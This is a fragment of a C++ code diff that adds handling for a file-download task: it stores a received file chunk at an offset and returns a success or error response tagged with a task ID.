+                downloadRequest.offset))
+        {
+            throw std::runtime_error(
+                "File chunk could not be stored.");
+        }
+
+        return CreateTaskResponse(
+            taskID,
+            DOWNLOAD,
+            downloadRequest.final
+                ? DOWNLOAD_FINAL
+                : DOWNLOAD_CHUNK,
+            downloadRequest.final
+                ? DOWNLOAD_FINAL_STATUS
+                : DOWNLOAD_CHUNK_STATUS,
+            TaskSuccess{"File chunk stored."});
+    }
+    catch (const std::exception &exception)
+    {
+        return CreateTaskResponse(
+            taskID,
+            DOWNLOAD,
+            NO_CODE,
+            ERROR,
+            TaskError{
+                1,
+                exception.what()});
+    }
 }
